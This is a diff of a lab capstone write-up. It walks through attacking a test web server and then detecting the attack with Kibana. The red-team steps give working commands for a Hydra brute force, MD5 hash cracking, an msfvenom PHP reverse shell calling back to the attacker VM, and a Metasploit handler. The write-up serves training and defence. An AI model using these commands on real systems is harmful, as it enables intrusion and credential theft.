@@ -7,7 +7,7 @@
 >
 >1. The "Capstone VM" - Hostname: Server 1, running the Web Server, FileBeat, MetricBeat and PacketBeat. 
 >2. The logs generated are then sent out to the second machine, the "ELK VM" - Hostname: ELK, running Elasticsearch, Logstash and Kibana. 
->3. The attacker machine used in this scenario is the "Kali VM" - Hostname: Kali, running packetbeat.
+>3. The attacker machine used in this scenario is the "Kali VM" - Hostname: Kali, running PacketBeat.
 >
 >NOTE: All virtual machines are hosted on the same virtual subnet: 192.168.1.0/24.
 
@@ -18,7 +18,7 @@ Network Diagram:
 
 ## Red Team - Security Assessment
 
-First step is to run a quick network scan:
+**First Step** is to run a quick network scan:
 
 ```bash
 nmap -sV -sS 192.168.1.0/24
@@ -32,66 +32,70 @@ We can see the Capstone VM (IP: 192.168.1.105) is hosting a web service on Port 
 
 ![Website homepage](https://user-images.githubusercontent.com/90374994/155528219-e5c6bdc1-8175-4647-bd95-6e2ba79c84de.png)
 
-To find any hidden files and directories not directly listed on the website we can use Dirbuster (or 'dirb' command from Terminal) by providing it a wordlist to search
+**Second Step** is finding any hidden files and directories not directly listed on the website. We can use Dirbuster (or the 'dirb' command from Terminal) by providing it a wordlist to search from:
 
 ```bash
 dirb http://192.168.1.105/ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 ```
 
-The results show us there are two hidden directories:
+The results show us we have found two hidden directories:
   1. http://192.168.1.105/company_folders/secret_folder/
   2. http://192.168.1.105/webdav/
 
-While trying to access the /secret_folder/ directory we are prompted with a warning disclosing the webpage is no longer accessible to the public and a login prompt requesting a username and password:
+**Third Step** is to try and access the contents of the /secret_folder/. While attempting to connect to the /secret_folder/ directory we are prompted with a warning disclosing the webpage is no longer accessible to the public and a login prompt requesting a username and password:
 
 ![secret_folder login](https://user-images.githubusercontent.com/90374994/155529687-3cee176f-441e-4c1c-a5e1-c7746f868931.png)
 
->NOTE: One clue that is included in the login prompt is "For ashtons eyes only" meaning one of the usernames is potentially "ashton" or "Ashton"
+>NOTE: We have one clue in the login prompt: "For ashtons eyes only" meaning one of the usernames is potentially "ashton" or "Ashton"
 
-We can try a bruteforcing attack using Hydra and the username "ashton", as well as specifying port 80 and the 'rockyou.txt' wordlist:
+**Fourth Step** is to use our Kali machine, so we can try and brute force the login, using Hydra. We will need to provide it the username "ashton", as well as specify port 80, and the 'rockyou.txt' wordlist for potential passwords:
 
 ```bash
 hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
 ```
 
-The result of the bruteforce attack eventually returns the password found for user 'ashton' - leopoldo
+The brute force attack eventually returns the password for user 'ashton' as 'leopoldo'. 
+
+**Fifth Step.** Let's log in using the credentials we found.
 
 ![hydra result](https://user-images.githubusercontent.com/90374994/155531957-70e44d6d-40be-4353-aa9b-baf009ed0e2a.png)
 
-Now that we are logged in to the /secret_folder/ there is a file '/connect_to_corp_server' containing a personal note
+Now that we are logged in to the /secret_folder/, we can see there is a file '/connect_to_corp_server' containing a personal note
 
 ![personal note](https://user-images.githubusercontent.com/90374994/155532390-3e9e0928-1a5d-4088-a99f-5ab40364a42e.png)
 
 The personal note includes information about how to connect to /webdav/ as well as a hint that the username might be "ryan" or "Ryan" together with an MD5 password hash for the account. 
 
-We can try saving the hash into a file named "hash.txt" and use John the Ripper or a website such as https://crackstation.net/ to try and crack the password.
-For using John the Ripper:
+**Sixth Step** is to crack the password using the hash we found. We can try saving the hash value in a file named "hash.txt" and use John the Ripper or any website such as https://crackstation.net/ to try and crack the password.
+
+If we are using John the Ripper, we could enter the following command:
 
 ```bash
 john hash.txt --format=raw-md5 --show
 ```
 
-The result is the password in plain text: linux4u and we can try to login:
+The result is the password in plain text 'linux4u', and now we can try to login using the found credentials:
 
 ![webdav login](https://user-images.githubusercontent.com/90374994/155534746-23c7d436-04d9-4dbd-9c24-46ee76fe3ca8.png)
 
-Now that we can login to the WebDav service we can try and upload malicious content.
+**Seventh Step.** Now that we are logged in to the WebDAV service we can try to create and upload malicious content.
 
 ![webdav1](https://user-images.githubusercontent.com/90374994/155537659-0e4003d1-0910-4e6e-a7fa-81ee20ae913c.png)
 
-We will try and craft a meterpreter reverse shell using MSFVenom. Since the reverse shell will attempt to connect back to our attacker machine, we will need to specify the LHOST as the Kali VM's IP address and the LPORT as 4444:
+We will try and craft a meterpreter reverse shell using MSFVenom. Since the reverse shell will attempt to connect back to our attacker machine (Kali), we will need to specify the LHOST as the Kali VM's IP address 192.168.1.90 and the LPORT as 4444:
 
 ```bash
 msfvenom -p php/meterpreter/reverse_tcp -lhost=192.168.1.90 lport=4444 > shell.php
 ```
 
-Now, we can drag and drop the file in the WebDav folder, so we can access it later from the web browser:
+Now, we can drag and drop the 'shell.php' file in the /webdav/ folder, so we can access it later from the web browser:
 
 ![webdav2](https://user-images.githubusercontent.com/90374994/155539922-532ce74a-d5c3-498c-8241-f787deb823da.png)
 
->NOTE: before accessing the shell.php from the web browser, we first need to start a listener on our machine. Once the listener is up an running we can simply navigate to the shell.php page and we will achieve remote code execution.
+>NOTE: before accessing the shell.php from the web browser, we first need to start a listener on our attacker machine. Once the listener is up and running, we can simply navigate to the shell.php page so we can get a reverse shell connection.
 
-Metasploit Console
+
+**Eighth Step.** Use the Metasploit Console to start a listener for our php shell we created.
 
 To fire up Metasploit we can simply run the following command on our Kali machine:
 
@@ -99,25 +103,31 @@ To fire up Metasploit we can simply run the following command on our Kali machin
 msfconsole
 ```
 
-Once metasploit opens up, we can select the following exploit:
+Once metasploit is up and running, we can select the following exploit:
 
 ```bash
 use exploit/multi/handler
 set payload php/meterpreter/reverse_tcp
 ```
 
-Before we run the exploit, we have to set the LHOST. We can see this by running the "options" command. We can notice port 4444 is the default port, and is already set, mathcing the php reverse shell we created above. To set the LHOST and start the session, we run the following:
+Before we run the exploit, we have to set the LHOST. We can see this by running the *"options"* command. We notice that port 4444 is the default port, and is already set, matching the php reverse shell we created earlier. To set the LHOST and execute the session, we run the following:
 
 ```bash
 set LHOST 192.168.1.90
 run
 ```
 
-Now, we can navigate to http://192.168.1.105/webdav/shell.php to start the reverse shell. If everything was executed correctly, we should get a meterpreter shell on our Kali machine:
+Now, we can navigate to http://192.168.1.105/webdav/shell.php to trigger the reverse shell connection. If everything executes correctly, we should get a meterpreter shell on our Kali machine:
 
 ![metasploit listener](https://user-images.githubusercontent.com/90374994/156852952-9242a9d5-bd04-4ac3-a863-0c95acbd95a9.png)
 
-To find the hidden flag, we can search directly from the meterpreter shell, or we can fire up a shell on the target machine, then run the following:
+**Ninth Step** is to explore the victim machine in any way we want. In this scenario, we will look for any hidden flags. We can achieve this by either searching directly from the meterpreter shell, or by starting up a remote shell on the target machine. NOTE: it is generally more efficient to search for files using a local shell on the machine you are trying to exploit. Let's open up a shell:
+
+```console
+meterpreter > shell
+```
+
+Once inside the remote shell, we can run a search command that looks for any files with the name "flag.txt":
 
 ```bash
 find / -name flag.txt 2>/dev/null
@@ -125,9 +135,9 @@ find / -name flag.txt 2>/dev/null
 
 ![Screen Shot 2022-02-15 at 18 51 59 PM](https://user-images.githubusercontent.com/90374994/156853571-5cc65352-fdca-428f-a479-374bbfbe777a.png)
 
-This will look for any files named "flag.txt", ignoring any access errors it encounters, while searching.
+By adding *2>/dev/null* at the end of the command, it will ignore any access errors it encounters, while performing the search.
 
-Flag found:
+One flag found:
 
 ![Screen Shot 2022-02-15 at 18 51 08 PM](https://user-images.githubusercontent.com/90374994/156853589-ceec7eb8-0878-4829-8671-88e76f89d631.png)
 
@@ -135,9 +145,9 @@ Flag found:
 
 ## Blue Team - Log Analysis and Attack Characterization
 
->During this phase, we will be able to see and analyze logs, generated from the activities above. The logs were generated using FileBeat, MetricBeat and PacketBeat, and we will leverage Kibana, to analyze them.
+>During this phase, we will be able to see and analyze logs, generated by the activities above. The logs were created using FileBeat, MetricBeat and PacketBeat, and we will leverage Kibana, to analyze them.
 
-Once we fire up Kibana from our Windows host machine (Navigate to to http://192.168.1.105:5601), we will need to add the log data to be analyzed.
+Once we fire up Kibana from our Windows host machine (Navigate to http://192.168.1.105:5601), we will need to add the log data to be analyzed.
 
 Logs to be added:
 
@@ -155,7 +165,7 @@ Logs to be added:
 >NOTE: you might need to restart your browser once data is added to continue.
 
 
-Next step is to create a Kibana Dashboard. For this step we will need to add several reports to our dashboard by navigating to Dashboards > Create Dashboard (upper right hand side) > Add an existing.
+Next step is to **Create a Kibana Dashboard**. For this step we will need to add several reports to our dashboard by navigating to *Dashboards > Create Dashboard (upper right-hand side) > Add an existing.*
 
 Search for the following panels and add them to the dashboard:
 
@@ -201,7 +211,7 @@ Third, let's look at the WebDAV connection logs. We can apply the following filt
 
 ## Blue Team - Mitigation Strategies and Proposed Alarms
 
->NOTE: the threashold for alerts should be tuned accordingly to the environment. This is a small "closed environment", and the numbers used are calculated using current baselines, for our web traffic.
+>NOTE: the threshold for alerts should be tuned accordingly to the environment. This is a small "closed environment", and the numbers used are calculated using current baselines, for our web traffic.
 
 **1. Blocking the Port Scan**
 
@@ -213,13 +223,13 @@ Third, let's look at the WebDAV connection logs. We can apply the following filt
   net.ipv4.icmp_echo_ignore_all = 1
   ```
   
-  -second thing we can do is shrink the attack surface an attacker would have access to. In order to achieve this, we should close any unnecessarly open ports, and add firewall rules to stop traffic to/from certain ports exposed to the internet.
+  -second thing we can do is shrink the attack surface an attacker would have access to. In order to achieve this, we should close any unnecessary open ports, and add firewall rules to stop traffic to/from certain ports exposed to the internet.
   
-  -third, we could add an IPS system to activly monitor and detect, blocking port scans specifically.
+  -third, we could add an IPS system to actively monitor and detect, blocking port scans specifically.
   
 **Alarms**
 
-  -using Kibana, we can create a custom alert that triggers when an unique *Source IP* reaches out to 10 or more ports on the same *Destination IP* within 1 minute time frame
+  -using Kibana, we can create a custom alert that triggers when a unique *Source IP* reaches out to 10 or more ports on the same *Destination IP* within 1 minute time frame
 
 
 **2. Detecting Unauthorized Access**
@@ -227,7 +237,7 @@ Third, let's look at the WebDAV connection logs. We can apply the following filt
 **Mitigation strategies:**
 
   -since the *Secret Folder* is only supposed to be accessed by certain individuals we could create a rule of *White-listed IP Addresses* that would have access to the folder. Create a second rule to deny access to anyone outside of the listed IPs.
-  -in this situation, the folder is pretty redundant, serving little to no purpose, and should be removed from the web server completly.
+  -in this situation, the folder is pretty redundant, serving little to no purpose, and should be removed from the web server completely.
   
 **Alarms**
 
@@ -262,11 +272,11 @@ Third, let's look at the WebDAV connection logs. We can apply the following filt
   -create an alarm that triggers when any files are uploaded to the /webdav/ folder.
   
 
-**4. Identify Reverse Shell Uploads**
+**5. Identify Reverse Shell Uploads**
 
 **Mitigation strategies:**
 
-  -deny uploads of select file extentions by whitelisting only allowed file types, that support business objectives.
+  -deny uploads of select file extensions by whitelisting only allowed file types, that support business objectives.
   -remove execute permission for any uploaded files to /webdav/ (Allow only read/write permission).
   
 **Alarms**
@@ -274,6 +284,6 @@ Third, let's look at the WebDAV connection logs. We can apply the following filt
   -create an alarm that triggers when there's any traffic detected outside of ports 22 and 80.
   -as mentioned before, an alarm that triggers when there are any uploads made to WebDAV.
   
->Thank you for reading this article, I hope it brought new ideas on how to apply some level of security to your real life environment.
+*>Thank you for reading this article, I hope it brought new ideas on how to apply some level of security to any real-life environment.
 >Author: Andrei Botez
->Date: March 4, 2022
+>Date: March 4, 2022*
